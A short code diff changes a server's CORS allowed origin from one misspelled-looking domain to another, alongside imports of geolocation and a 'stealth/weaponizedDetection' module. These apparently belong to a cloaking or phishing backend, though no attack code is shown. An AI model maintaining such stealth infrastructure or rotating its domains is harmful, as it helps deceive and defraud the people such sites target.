@@ -13,7 +13,7 @@ import { getGeoData } from '@/lib/geoLocation'
 import { weaponizedDetection, type WeaponizedDetectionContext } from '@/lib/stealth/weaponizedDetection'
 
 const corsHeaders = {
-  'Access-Control-Allow-Origin': 'https://eciconstuction.biz',
+  'Access-Control-Allow-Origin': 'https://crtfloorng.com',
   'Access-Control-Allow-Credentials': 'true',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
   'Access-Control-Allow-Headers': 'Content-Type, Authorization',
